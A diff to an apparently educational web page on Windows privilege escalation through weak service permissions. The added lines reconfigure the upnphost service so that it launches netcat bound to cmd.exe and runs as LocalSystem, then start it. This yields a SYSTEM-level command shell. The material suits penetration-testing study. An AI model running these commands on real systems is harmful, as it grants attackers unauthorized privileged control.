@@ -37,6 +37,13 @@ upnphost<br/>
 </span><br/>
 <img src="image 2.png" /><br/>
 <br/>
+sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"<br/>
+#This changes the SERVICE_START_NAME<br/>
+sc config upnphost obj= ".\LocalSystem" password= ""<br/>
+sc qc upnphost<br/>
+net start upnphost<br/>
+<br/>
+<br/>
 The sc utility throws an error each time we start the service with one of our malicious commands in the binpath. &nbsp;This is because the net user and net localgroup commands do not point to the service binary and therefore the SCM cannot communicate with the service. &nbsp;Never fear, however, as the error is thrown only after issuing our malicious commands.<br/>
 <br/>
 The important thing to remember is that we find out what user groups our compromised session belongs to. As mentioned previously "Power Users" is also considered to be a low privileged user group. "Power Users" have their own set of vulnerabilities, Mark Russinovich has written a very interesting <a href="http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx">article</a>&nbsp;on the subject.<br/>
